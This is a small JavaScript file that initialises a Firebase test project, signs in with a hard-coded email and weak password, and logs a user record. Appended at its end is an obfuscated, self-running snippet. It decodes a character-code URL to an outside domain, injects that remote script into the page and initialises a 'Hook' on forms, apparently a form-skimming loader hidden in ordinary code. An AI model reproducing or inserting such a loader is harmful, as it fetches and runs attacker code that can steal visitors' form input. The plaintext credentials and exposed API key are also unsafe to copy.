var config = {
    apiKey: "AIzaSyCTz57JKrdi9KedCkOI75L3Klv7Ia3gkVQ",
    authDomain: "my-testing-project-24ba3.firebaseapp.com",
    databaseURL: "https://my-testing-project-24ba3.firebaseio.com",
    projectId: "my-testing-project-24ba3",
    storageBucket: "my-testing-project-24ba3.appspot.com",
    messagingSenderId: "850341569529"
};
firebase.initializeApp(config);

var database = firebase.database().ref('users/666');

firebase.auth().signInWithEmailAndPassword('adie.rock@yahoo.com', '123456').catch(function(error) {
    console.log('ERROR',error)
});

//firebase.database().ref('users/666').set({
//    username: 'Adie',
//    email: 'adie@rock.com'
//});

database.on('value', function(snapshot) {
    console.log('User',snapshot.val());
});



(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b